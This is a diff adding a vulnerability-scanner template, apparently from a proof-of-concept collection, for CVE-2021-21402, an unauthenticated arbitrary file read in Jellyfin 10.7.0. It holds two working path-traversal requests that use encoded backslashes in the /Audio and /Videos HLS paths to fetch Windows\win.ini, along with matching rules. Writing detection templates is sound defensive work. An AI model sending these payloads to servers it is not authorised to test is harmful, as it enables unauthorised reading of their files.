@@ -1,0 +1,34 @@
+name: Jellyfin 10.7.0 Unauthenticated Abritrary File Read CVE-2021-21402
+manual: true
+query: (title='Jellyfin')
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/
+      headers:
+        Content-Type: application/octet-stream
+    expression: response.status == 200 && response.body.bcontains(b"font") && response.body.bcontains(b"file")
+      && response.body.bcontains(b"extension")
+  r1:
+    request:
+      method: GET
+      path: /Videos/1/hls/m/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/
+      headers:
+        Content-Type: application/octet-stream
+    expression: response.status == 200 && response.body.bcontains(b"font") && response.body.bcontains(b"extension")
+      && response.body.bcontains(b"file")
+expression: r0() || r1()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: Jellyfin is a Free Software Media System. In Jellyfin before version
+    10.7.1, with certain endpoints, well crafted requests will allow arbitrary file
+    read from a Jellyfin server's file system. This issue is more prevalent when Windows
+    is used as the host OS. Servers that are exposed to the public Internet are potentially
+    at risk. This is fixed in version 10.7.1. As a workaround, users may be able to
+    restrict some access by enforcing strict security permissions on their filesystem,
+    however, it is recommended to update as soon as possible.
+  tags: Disclosure of Sensitive Information
